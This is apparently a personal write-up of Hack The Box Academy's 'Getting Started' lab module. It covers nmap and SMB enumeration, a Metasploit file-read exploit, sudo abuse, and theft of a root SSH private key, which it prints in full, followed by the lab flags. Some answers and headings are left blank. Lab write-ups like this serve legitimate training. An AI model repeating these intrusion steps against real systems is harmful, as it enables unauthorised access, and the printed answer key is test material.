# Getting Started
* Source: [Hack the Box: Academy](https://academy.hackthebox.com/)
* Module: Getting Started
* Tier: 0
* Difficulty: Fundamental
* Category: Offensive
* Time estimate: 8 hours
* Date: DD-MM-YYYY
* Author: [DjikstraCS](https://github.com/DjikstraCS)

---
## Basic Tools
### Question:
![](./attachments/Pasted%20image%2020221117112756.png)

```
┌──(kali㉿kali)-[~]
└─$ nc 178.62.84.158 30907
SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.1
```

**Answer:** `SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.1`

---
## Service Scanning
### Question 1:
![](./attachments/Pasted%20image%2020221117115657.png)
*Hint: Execute sudo nmap -sV {target IP} and check the result under Version*

```
┌──(kali㉿kali)-[~]
└─$ nmap -n -sV -p 8080 10.129.92.39
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-17 05:59 EST
Nmap scan report for 10.129.92.39
Host is up (0.036s latency).

PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.02 seconds
```

**Answer:** `Apache Tomcat`

### Question 2:
![](./attachments/Pasted%20image%2020221117115716.png)
*Hint: Perform a full port scan using -p-*

```
┌──(kali㉿kali)-[~]
└─$ nmap -n -sV -p- 10.129.92.39
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-17 06:00 EST
Nmap scan report for 10.129.92.39
Host is up (0.039s latency).
Not shown: 65528 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.41 ((Ubuntu))
139/tcp  open  netbios-ssn Samba smbd 4.6.2
445/tcp  open  netbios-ssn Samba smbd 4.6.2
2323/tcp open  telnet      Linux telnetd
8080/tcp open  http        Apache Tomcat
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.64 seconds
```

**Answer:** `2323`
 
### Question 3:
![](./attachments/Pasted%20image%2020221117115744.png)
*Hint: Bob likes to use weak passwords.*

```
┌──(kali㉿kali)-[~]
└─$ smbclient -U bob \\\\10.129.92.39\\users 
Password for [WORKGROUP\bob]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Feb 25 18:06:52 2021
  ..                                  D        0  Thu Feb 25 15:05:31 2021
  flag                                D        0  Thu Feb 25 18:09:26 2021
  bob                                 D        0  Thu Feb 25 16:42:23 2021

                4062912 blocks of size 1024. 944756 blocks available
smb: \> cd flag
smb: \flag\> ls
  .                                   D        0  Thu Feb 25 18:09:26 2021
  ..                                  D        0  Thu Feb 25 18:06:52 2021
  flag.txt                            N       33  Thu Feb 25 18:09:26 2021

                4062912 blocks of size 1024. 944748 blocks available
smb: \flag\> get flag.txt
getting file \flag\flag.txt of size 33 as flag.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec) 
┌──(kali㉿kali)-[~]
└─$ cat flag.txt               
dceece590f3284c3866305eb2473d099
```

**Answer:** `dceece590f3284c3866305eb2473d099`

---
## Web Enumeration
### Question:
*Hint: Everything you need to login is given to you*

![](./attachments/Pasted%20image%2020221117122102.png)

Visit the show path `/admin-login-page.php`

![](./attachments/Pasted%20image%2020221117122203.png)

Default credentials are visible in the source code.

User:pass `admin:password123`

![](./attachments/Pasted%20image%2020221117122044.png)

**Answer:** `HTB{w3b_3num3r4710n_r3v34l5_53cr375}`

---
## Public Exploits
### Question:
![](./attachments/Pasted%20image%2020221117122824.png)

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -n -sC -sV -p32426 46.101.0.22
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-17 06:29 EST
Nmap scan report for 46.101.0.22
Host is up (0.010s latency).

PORT      STATE SERVICE VERSION
32426/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Getting Started &#8211; Just another WordPress site
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-generator: WordPress 5.6.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.25 seconds
```

Visit the page:

![](./attachments/Pasted%20image%2020221117125435.png)

Search for `Simple Backup Plugin 2.7.10` in Metasploit.

```bash
msf6 > search exploit Simple Backup Plugin 2.7.10

Matching Modules
================

   #  Name                                               Disclosure Date  Rank    Check  Description
   -  ----                                               ---------------  ----    -----  -----------
   0  auxiliary/scanner/http/wp_simple_backup_file_read                   normal  No     WordPress Simple Backup File Read Vulnerability


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/http/wp_simple_backup_file_read

msf6 > use 0
msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > options

Module options (auxiliary/scanner/http/wp_simple_backup_file_read):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   DEPTH      6                yes       Traversal Depth (to reach the root folder)
   FILEPATH   /etc/passwd      yes       The path to the file to read
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   THREADS    1                yes       The number of concurrent threads (max one per host)
   VHOST                       no        HTTP server virtual host

msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > set rhost 46.101.0.22
rhost => 46.101.0.22
msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > set rport 30846
rport => 30846
msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > set filepath /flag.txt
filepath => /flag.txt
msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > run

[+] File saved in: /home/kali/.msf4/loot/20221117065310_default_46.101.0.22_simplebackup.tra_338516.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/http/wp_simple_backup_file_read) >
```

Read the output file:

```
┌──(kali㉿kali)-[/usr/share/exploitdb]
└─$ cat /home/kali/.msf4/loot/20221117065310_default_46.101.0.22_simplebackup.tra_338516.txt
HTB{my_f1r57_h4ck}
```

**Answer:** `HTB{my_f1r57_h4ck}`

---
## Privilege Escalation
### Question 1:
![](./attachments/Pasted%20image%2020221117133900.png)
*Hint: Review what you learned in this module*

```
┌──(kali㉿kali)-[~]
└─$ ssh user1@161.35.169.118 -p 31236
The authenticity of host '[161.35.169.118]:31236 ([161.35.169.118]:31236)' can't be established.
ED25519 key fingerprint is SHA256:KDcF5lg81jNEGgdr67bEo+Ui1pmsyHXKnw/ZHPLZCyY.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[161.35.169.118]:31236' (ED25519) to the list of known hosts.
(user1@161.35.169.118) Password: 
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.10.0-0.deb10.17-amd64 x86_64)

(...)

user1@gettingstartedprivesc-476470-65b4ccfbdf-wtx99:~$ sudo -l
Matching Defaults entries for user1 on
    gettingstartedprivesc-476470-65b4ccfbdf-wtx99:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user1 may run the following commands on
        gettingstartedprivesc-476470-65b4ccfbdf-wtx99:
    (user2 : user2) NOPASSWD: /bin/bash
user1@gettingstartedprivesc-476470-65b4ccfbdf-wtx99:~$ sudo -u user2 /bin/bash
user2@gettingstartedprivesc-476470-65b4ccfbdf-wtx99:/$ whoami
user2
user2@gettingstartedprivesc-476470-65b4ccfbdf-wtx99:/$ cat /home/user2/flag.txt
HTB{l473r4l_m0v3m3n7_70_4n07h3r_u53r}
```

**Answer:** ``

### Question 2:
![](./attachments/Pasted%20image%2020221117133914.png)
*Hint: Don't forget to chmod*

```
user2@gettingstartedprivesc-483697-6d5d5f75bf-ft2br:/$ ls -lah /root/.ssh
total 20K
drwxr-x--- 1 root user2 4.0K Feb 12  2021 .
drwxr-x--- 1 root user2 4.0K Feb 12  2021 ..
-rw------- 1 root root   571 Feb 12  2021 authorized_keys
-rw-r--r-- 1 root root  2.6K Feb 12  2021 id_rsa
-rw-r--r-- 1 root root   571 Feb 12  2021 id_rsa.pub
user2@gettingstartedprivesc-483697-6d5d5f75bf-ft2br:/$ cat /root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

Now that we have the SSH key, we can log in to the root user by copying the key to our Kali machine. 

```
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo nano id_rsa
[sudo] password for kali: 
```

Key is inserted in a new `id_rsa` file on our Kali machine.

```
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo chmod 600 id_rsa

┌──(kali㉿kali)-[~/Downloads]
└─$ sudo ssh root@161.35.169.118 -p 31236 -i id_rsa
The authenticity of host '[161.35.169.118]:31236 ([161.35.169.118]:31236)' can't be established.
ED25519 key fingerprint is SHA256:KDcF5lg81jNEGgdr67bEo+Ui1pmsyHXKnw/ZHPLZCyY.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[161.35.169.118]:31236' (ED25519) to the list of known hosts.
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.10.0-0.deb10.17-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

root@gettingstartedprivesc-476470-65b4ccfbdf-wtx99:~# cat /root/falg.txt
cat: /root/falg.txt: No such file or directory
root@gettingstartedprivesc-476470-65b4ccfbdf-wtx99:~# cat /root/flag.txt
HTB{pr1v1l363_35c4l4710n_2_r007}
```

**Answer:** `HTB{pr1v1l363_35c4l4710n_2_r007}`

---
## 
### Question:
![](Pasted%20image%2020230119122416.png)
*Hint: Check out what was REDACTED from the above nmap output. The answer should be in the same place.*

```
┌──(kali㉿kali)-[~/HTB/Nibbles]
└─$ nmap -sV -sC -p80 -oA nibbles_service_script_80 10.129.85.113
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-19 06:23 EST
Nmap scan report for 10.129.85.113
Host is up (0.14s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.42 seconds
```

**Answer:** `2.4.18`

---
## 
### Question:
![](Pasted%20image%2020230119125741.png)

```

```

**Answer:** `79c03865431abf47b90ef24b9695e148`

---
## 
### Question:
*Hint: *

**Answer:** ``

---
**Tags:** [[Hack The Box Academy]]